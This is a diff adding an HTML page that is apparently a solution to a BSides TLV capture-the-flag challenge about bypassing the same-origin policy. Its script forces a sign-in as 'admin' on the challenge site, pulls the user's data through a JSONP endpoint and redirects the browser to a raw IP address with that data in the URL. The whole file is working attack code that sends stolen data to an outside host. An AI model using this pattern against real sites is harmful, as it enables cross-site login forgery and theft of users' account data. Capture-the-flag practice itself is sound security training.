@@ -1,0 +1,21 @@
+<head>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+</head>
+<script>
+let http = new XMLHttpRequest();
+    http.open('POST', 'https://can-you-bypass-the-sop.ctf.bsidestlv.com/signIn', true);
+    http.setRequestHeader('Content-type', 'application/json');
+    http.onreadystatechange = function() {//Call a function when the state changes.
+        if(http.readyState === 4 && http.status === 200) {
+            $.ajax({
+                dataType: 'jsonp',
+                jsonp: 'callback',
+                url: 'https://can-you-bypass-the-sop.ctf.bsidestlv.com/FetchUserInfo?callback=?',
+                success: function (data) {
+window.location = "http://144.217.241.87:8000/?c="+JSON.stringify(data)
+                }
+            });
+        }
+    };
+    http.send(JSON.stringify({username: "admin"}));
+</script>
